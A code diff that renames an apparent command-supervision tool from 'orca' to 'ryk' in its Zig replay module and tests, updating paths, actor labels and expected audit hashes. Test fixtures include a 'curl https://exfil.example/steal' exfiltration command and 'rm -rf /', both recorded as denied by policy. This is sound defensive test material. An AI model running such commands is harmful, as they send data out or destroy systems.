@@ -1,8 +1,8 @@
 const std = @import("std");
 
-const core = @import("orca_core").core;
+const core = @import("ryk_core").core;
 const supervisor = core.supervisor;
-const core_api = @import("orca_core").api;
+const core_api = @import("ryk_core").api;
 const brand = @import("brand.zig");
 const exit_codes = @import("exit_codes.zig");
 const help = @import("help.zig");
@@ -326,7 +326,7 @@ const empty_sessions_hint =
 ;
 
 fn listSessions(io: std.Io, allocator: std.mem.Allocator, workspace_root: []const u8, stdout: anytype) !u8 {
-    const sessions_dir = try std.fs.path.join(allocator, &.{ workspace_root, ".orca", "sessions" });
+    const sessions_dir = try std.fs.path.join(allocator, &.{ workspace_root, ".ryk", "sessions" });
     defer allocator.free(sessions_dir);
 
     var dir = std.Io.Dir.cwd().openDir(io, sessions_dir, .{ .iterate = true }) catch |err| switch (err) {
@@ -408,14 +408,14 @@ fn parseOptions(io: std.Io, argv: []const []const u8, stdout: anytype, stderr: a
 
 fn sessionDirPathForError(io: std.Io, allocator: std.mem.Allocator, workspace_root: []const u8, requested: []const u8) ![]u8 {
     const session_id = if (std.mem.eql(u8, requested, "last")) blk: {
-        const last_path = try std.fs.path.join(allocator, &.{ workspace_root, ".orca", "last" });
+        const last_path = try std.fs.path.join(allocator, &.{ workspace_root, ".ryk", "last" });
         defer allocator.free(last_path);
         const text = try std.Io.Dir.cwd().readFileAlloc(io, last_path, allocator, .limited(core.limits.max_session_id_len + 2));
         defer allocator.free(text);
         break :blk try allocator.dupe(u8, std.mem.trim(u8, text, " \t\r\n"));
     } else try allocator.dupe(u8, requested);
     defer allocator.free(session_id);
-    return try std.fs.path.join(allocator, &.{ workspace_root, ".orca", "sessions", session_id });
+    return try std.fs.path.join(allocator, &.{ workspace_root, ".ryk", "sessions", session_id });
 }
 
 test "replay rejects invalid --only value" {
@@ -433,14 +433,14 @@ test "replay --list prints sessions or friendly empty message" {
     var tmp = std.testing.tmpDir(.{});
     defer tmp.cleanup();
 
-    try tmp.dir.createDirPath(std.testing.io, ".orca");
+    try tmp.dir.createDirPath(std.testing.io, ".ryk");
     {
-        const policy_file = try tmp.dir.createFile(std.testing.io, ".orca/policy.yaml", .{});
+        const policy_file = try tmp.dir.createFile(std.testing.io, ".ryk/policy.yaml", .{});
         defer policy_file.close(std.testing.io);
         try policy_file.writeStreamingAll(std.testing.io, "version: 1\nmode: observe\n");
     }
-    try tmp.dir.createDirPath(std.testing.io, ".orca/sessions/session-a");
-    try tmp.dir.createDirPath(std.testing.io, ".orca/sessions/session-b");
+    try tmp.dir.createDirPath(std.testing.io, ".ryk/sessions/session-a");
+    try tmp.dir.createDirPath(std.testing.io, ".ryk/sessions/session-b");
 
     const prev_cwd = try std.Io.Dir.cwd().realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
     defer std.testing.allocator.free(prev_cwd);
@@ -463,9 +463,9 @@ test "replay with no args and no sessions shows friendly empty state" {
     var tmp = std.testing.tmpDir(.{});
     defer tmp.cleanup();
 
-    try tmp.dir.createDirPath(std.testing.io, ".orca");
+    try tmp.dir.createDirPath(std.testing.io, ".ryk");
     {
-        const policy_file = try tmp.dir.createFile(std.testing.io, ".orca/policy.yaml", .{});
+        const policy_file = try tmp.dir.createFile(std.testing.io, ".ryk/policy.yaml", .{});
         defer policy_file.close(std.testing.io);
         try policy_file.writeStreamingAll(std.testing.io, "version: 1\nmode: observe\n");
     }
@@ -496,9 +496,9 @@ test "replay with no args loads last session timeline" {
     defer tmp.cleanup();
     const root = try tmp.dir.realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
     defer std.testing.allocator.free(root);
-    try tmp.dir.createDirPath(std.testing.io, ".orca");
+    try tmp.dir.createDirPath(std.testing.io, ".ryk");
     {
-        const policy_file = try tmp.dir.createFile(std.testing.io, ".orca/policy.yaml", .{});
+        const policy_file = try tmp.dir.createFile(std.testing.io, ".ryk/policy.yaml", .{});
         defer policy_file.close(std.testing.io);
         try policy_file.writeStreamingAll(std.testing.io, "version: 1\nmode: strict\n");
     }
@@ -529,9 +529,9 @@ test "replay human timeline emphasizes denied actions" {
     defer tmp.cleanup();
     const root = try tmp.dir.realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
     defer std.testing.allocator.free(root);
-    try tmp.dir.createDirPath(std.testing.io, ".orca");
+    try tmp.dir.createDirPath(std.testing.io, ".ryk");
     {
-        const policy_file = try tmp.dir.createFile(std.testing.io, ".orca/policy.yaml", .{});
+        const policy_file = try tmp.dir.createFile(std.testing.io, ".ryk/policy.yaml", .{});
         defer policy_file.close(std.testing.io);
         try policy_file.writeStreamingAll(std.testing.io, "version: 1\nmode: strict\n");
     }
@@ -565,9 +565,9 @@ test "replay human timeline emphasizes network_connect_denied without command_de
     defer tmp.cleanup();
     const root = try tmp.dir.realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
     defer std.testing.allocator.free(root);
-    try tmp.dir.createDirPath(std.testing.io, ".orca");
+    try tmp.dir.createDirPath(std.testing.io, ".ryk");
     {
-        const policy_file = try tmp.dir.createFile(std.testing.io, ".orca/policy.yaml", .{});
+        const policy_file = try tmp.dir.createFile(std.testing.io, ".ryk/policy.yaml", .{});
         defer policy_file.close(std.testing.io);
         try policy_file.writeStreamingAll(std.testing.io, "version: 1\nmode: strict\n");
     }
@@ -615,7 +615,7 @@ fn writeReplayTimelineFixture(io: std.Io, allocator: std.mem.Allocator, workspac
         .id = session_id,
         .started_at = now,
         .ended_at = now,
-        .command = "orca",
+        .command = "ryk",
         .args = &.{ "run", "--", "echo", "ok" },
         .workspace_root = workspace_root,
         .session_name = "replay-timeline-test",
@@ -634,7 +634,7 @@ fn writeReplayTimelineFixture(io: std.Io, allocator: std.mem.Allocator, workspac
             .event_id = event_id,
             .timestamp = now,
             .event_type = .secret_redacted,
-            .actor = .{ .kind = .orca, .display = "orca" },
+            .actor = .{ .kind = .ryk, .display = "ryk" },
             .target = .{ .kind = .env_var, .value = "TOKEN\x1b[2J\nvalue" },
             .decision = null,
             .redactions = .{ .count = 1, .labels = &.{"TOKEN"} },
@@ -649,7 +649,7 @@ fn writeReplayTimelineFixture(io: std.Io, allocator: std.mem.Allocator, workspac
         .event_id = allowed_id,
         .timestamp = now,
         .event_type = .command_allowed,
-        .actor = .{ .kind = .orca, .display = "orca" },
+        .actor = .{ .kind = .ryk, .display = "ryk" },
         .target = .{ .kind = .command, .value = "echo ok" },
         .decision = core_api.makeDecision(.{ .result = .allow, .reason = "allowed" }),
     });
@@ -660,7 +660,7 @@ fn writeReplayTimelineFixture(io: std.Io, allocator: std.mem.Allocator, workspac
         .status = .{ .exited = 0 },
         .event_count = audit_writer.event_count,
         .final_event_hash = audit_writer.finalHash() orelse "",
-        .policy = ".orca/policy.yaml",
+        .policy = ".ryk/policy.yaml",
         .product_label = brand.product_display,
     });
     return allocator.dupe(u8, audit_writer.session_id.slice());
@@ -676,7 +676,7 @@ fn writeReplayNetworkDenyFixture(io: std.Io, allocator: std.mem.Allocator, works
         .id = session_id,
         .started_at = now,
         .ended_at = now,
-        .command = "orca",
+        .command = "ryk",
         .args = &.{ "run", "--", "curl", "https://exfil.example/steal" },
         .workspace_root = workspace_root,
         .session_name = "replay-network-deny-test",
@@ -694,7 +694,7 @@ fn writeReplayNetworkDenyFixture(io: std.Io, allocator: std.mem.Allocator, works
         .event_id = allowed_id,
         .timestamp = now,
         .event_type = .command_allowed,
-        .actor = .{ .kind = .orca, .display = "orca" },
+        .actor = .{ .kind = .ryk, .display = "ryk" },
         .target = .{ .kind = .command, .value = "curl https://exfil.example/steal" },
         .decision = core_api.makeDecision(.{ .result = .allow, .reason = "command allowed" }),
     });
@@ -708,7 +708,7 @@ fn writeReplayNetworkDenyFixture(io: std.Io, allocator: std.mem.Allocator, works
         .event_id = denied_id,
         .timestamp = now,
         .event_type = .network_connect_denied,
-        .actor = .{ .kind = .orca, .display = "orca" },
+        .actor = .{ .kind = .ryk, .display = "ryk" },
         .target = .{ .kind = .network_endpoint, .value = "https://exfil.example/steal" },
         .decision = core_api.makeDecision(.{ .result = .deny, .reason = "network blocked by policy" }),
     });
@@ -720,7 +720,7 @@ fn writeReplayNetworkDenyFixture(io: std.Io, allocator: std.mem.Allocator, works
         .status = .{ .exited = 1 },
         .event_count = audit_writer.event_count,
         .final_event_hash = audit_writer.finalHash() orelse "",
-        .policy = ".orca/policy.yaml",
+        .policy = ".ryk/policy.yaml",
         .product_label = brand.product_display,
     });
     return allocator.dupe(u8, audit_writer.session_id.slice());
@@ -736,7 +736,7 @@ fn writeReplayDenyFixture(io: std.Io, allocator: std.mem.Allocator, workspace_ro
         .id = session_id,
         .started_at = now,
         .ended_at = now,
-        .command = "orca",
+        .command = "ryk",
         .args = &.{ "run", "--", "echo", "ok" },
         .workspace_root = workspace_root,
         .session_name = "replay-deny-test",
@@ -754,7 +754,7 @@ fn writeReplayDenyFixture(io: std.Io, allocator: std.mem.Allocator, workspace_ro
         .event_id = allowed_id,
         .timestamp = now,
         .event_type = .command_allowed,
-        .actor = .{ .kind = .orca, .display = "orca" },
+        .actor = .{ .kind = .ryk, .display = "ryk" },
         .target = .{ .kind = .command, .value = "echo ok" },
         .decision = core_api.makeDecision(.{ .result = .allow, .reason = "allowed" }),
     });
@@ -768,7 +768,7 @@ fn writeReplayDenyFixture(io: std.Io, allocator: std.mem.Allocator, workspace_ro
         .event_id = denied_id,
         .timestamp = now,
         .event_type = .command_denied,
-        .actor = .{ .kind = .orca, .display = "orca" },
+        .actor = .{ .kind = .ryk, .display = "ryk" },
         .target = .{ .kind = .command, .value = "rm -rf /" },
         .decision = core_api.makeDecision(.{ .result = .deny, .reason = "blocked by policy" }),
     });
@@ -780,7 +780,7 @@ fn writeReplayDenyFixture(io: std.Io, allocator: std.mem.Allocator, workspace_ro
         .status = .{ .exited = 1 },
         .event_count = audit_writer.event_count,
         .final_event_hash = audit_writer.finalHash() orelse "",
-        .policy = ".orca/policy.yaml",
+        .policy = ".ryk/policy.yaml",
         .product_label = brand.product_display,
     });
     return allocator.dupe(u8, audit_writer.session_id.slice());
@@ -791,9 +791,9 @@ test "replay human timeline collapses repeated redactions and json remains exact
     defer tmp.cleanup();
     const root = try tmp.dir.realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
     defer std.testing.allocator.free(root);
-    try tmp.dir.createDirPath(std.testing.io, ".orca");
+    try tmp.dir.createDirPath(std.testing.io, ".ryk");
     {
-        const policy_file = try tmp.dir.createFile(std.testing.io, ".orca/policy.yaml", .{});
+        const policy_file = try tmp.dir.createFile(std.testing.io, ".ryk/policy.yaml", .{});
         defer policy_file.close(std.testing.io);
         try policy_file.writeStreamingAll(std.testing.io, "version: 1\nmode: strict\n");
     }
@@ -830,7 +830,7 @@ test "replay human timeline collapses repeated redactions and json remains exact
 
     try std.testing.expectEqual(exit_codes.success, json_code);
     const expected_json =
-        \\[{"version":1,"session_id":"replay-timeline-fixture","event_id":"redaction-0","timestamp":"2026-05-05T12:12:10Z","type":"secret_redacted","actor":{"kind":"orca","id":null,"display":"orca"},"target":{"kind":"env_var","value":"TOKEN\u001b[2J\nvalue"},"decision":null,"redactions":{"count":1,"labels":["TOKEN"]},"previous_hash":null,"event_hash":"29372432ed1651996bc928c2cc25c8ff157175ead9291b4068659b20c1f8d44d"},{"version":1,"session_id":"replay-timeline-fixture","event_id":"redaction-1","timestamp":"2026-05-05T12:12:10Z","type":"secret_redacted","actor":{"kind":"orca","id":null,"display":"orca"},"target":{"kind":"env_var","value":"TOKEN\u001b[2J\nvalue"},"decision":null,"redactions":{"count":1,"labels":["TOKEN"]},"previous_hash":"29372432ed1651996bc928c2cc25c8ff157175ead9291b4068659b20c1f8d44d","event_hash":"5eb6b50592a40e8bfa8ce1954c43200f268bc29b3e8bbd803ae3c689250b7174"},{"version":1,"session_id":"replay-timeline-fixture","event_id":"redaction-2","timestamp":"2026-05-05T12:12:10Z","type":"secret_redacted","actor":{"kind":"orca","id":null,"display":"orca"},"target":{"kind":"env_var","value":"TOKEN\u001b[2J\nvalue"},"decision":null,"redactions":{"count":1,"labels":["TOKEN"]},"previous_hash":"5eb6b50592a40e8bfa8ce1954c43200f268bc29b3e8bbd803ae3c689250b7174","event_hash":"21f702fdba304ea68cefd97047a832d036955a10228d71b12365182c1df47ff4"},{"version":1,"session_id":"replay-timeline-fixture","event_id":"allowed","timestamp":"2026-05-05T12:12:10Z","type":"command_allowed","actor":{"kind":"orca","id":null,"display":"orca"},"target":{"kind":"command","value":"echo ok"},"decision":{"result":"allow","rule_id":null,"reason":"allowed","risk_score":null,"requires_user":false,"ci_may_proceed":false},"redactions":{"count":0,"labels":[]},"previous_hash":"21f702fdba304ea68cefd97047a832d036955a10228d71b12365182c1df47ff4","event_hash":"4a05248fac600beccd0816b25c49895076e4af2a457bba92f85eecd9c8765667"}]
+        \\[{"version":1,"session_id":"replay-timeline-fixture","event_id":"redaction-0","timestamp":"2026-05-05T12:12:10Z","type":"secret_redacted","actor":{"kind":"ryk","id":null,"display":"ryk"},"target":{"kind":"env_var","value":"TOKEN\u001b[2J\nvalue"},"decision":null,"redactions":{"count":1,"labels":["TOKEN"]},"previous_hash":null,"event_hash":"6e12aab094e89907622c2dd8edaf3e585b3eba40547ee2b6a9cac9d8fbac0b5a"},{"version":1,"session_id":"replay-timeline-fixture","event_id":"redaction-1","timestamp":"2026-05-05T12:12:10Z","type":"secret_redacted","actor":{"kind":"ryk","id":null,"display":"ryk"},"target":{"kind":"env_var","value":"TOKEN\u001b[2J\nvalue"},"decision":null,"redactions":{"count":1,"labels":["TOKEN"]},"previous_hash":"6e12aab094e89907622c2dd8edaf3e585b3eba40547ee2b6a9cac9d8fbac0b5a","event_hash":"3b316dccccabf41c1b9c12a67ecf533a46b18d00557b1f06c62f6907106bc9a3"},{"version":1,"session_id":"replay-timeline-fixture","event_id":"redaction-2","timestamp":"2026-05-05T12:12:10Z","type":"secret_redacted","actor":{"kind":"ryk","id":null,"display":"ryk"},"target":{"kind":"env_var","value":"TOKEN\u001b[2J\nvalue"},"decision":null,"redactions":{"count":1,"labels":["TOKEN"]},"previous_hash":"3b316dccccabf41c1b9c12a67ecf533a46b18d00557b1f06c62f6907106bc9a3","event_hash":"fc0f50fb4bd47f6ba2c88f2a2ed729f39ea299fafb3d15b19ecd06ebae39fdf7"},{"version":1,"session_id":"replay-timeline-fixture","event_id":"allowed","timestamp":"2026-05-05T12:12:10Z","type":"command_allowed","actor":{"kind":"ryk","id":null,"display":"ryk"},"target":{"kind":"command","value":"echo ok"},"decision":{"result":"allow","rule_id":null,"reason":"allowed","risk_score":null,"requires_user":false,"ci_may_proceed":false},"redactions":{"count":0,"labels":[]},"previous_hash":"fc0f50fb4bd47f6ba2c88f2a2ed729f39ea299fafb3d15b19ecd06ebae39fdf7","event_hash":"4841d6746c2b5ee5ffffdae0c0a6c2c9d94d013b08f0d4ae460f66d660872e75"}]
         \\
     ;
     try std.testing.expectEqualStrings(expected_json, actual_json.buffered());
@@ -851,9 +851,9 @@ test "replay --tui is rejected on non-interactive output (no colour terminal)" {
     defer tmp.cleanup();
     const root = try tmp.dir.realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
     defer std.testing.allocator.free(root);
-    try tmp.dir.createDirPath(std.testing.io, ".orca");
+    try tmp.dir.createDirPath(std.testing.io, ".ryk");
     {
-        const policy_file = try tmp.dir.createFile(std.testing.io, ".orca/policy.yaml", .{});
+        const policy_file = try tmp.dir.createFile(std.testing.io, ".ryk/policy.yaml", .{});
         defer policy_file.close(std.testing.io);
         try policy_file.writeStreamingAll(std.testing.io, "version: 1\nmode: strict\n");
     }
@@ -900,9 +900,9 @@ test "replay linear timeline is unchanged when --tui is absent" {
     defer tmp.cleanup();
     const root = try tmp.dir.realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
     defer std.testing.allocator.free(root);
-    try tmp.dir.createDirPath(std.testing.io, ".orca");
+    try tmp.dir.createDirPath(std.testing.io, ".ryk");
     {
-        const policy_file = try tmp.dir.createFile(std.testing.io, ".orca/policy.yaml", .{});
+        const policy_file = try tmp.dir.createFile(std.testing.io, ".ryk/policy.yaml", .{});
         defer policy_file.close(std.testing.io);
         try policy_file.writeStreamingAll(std.testing.io, "version: 1\nmode: strict\n");
     }
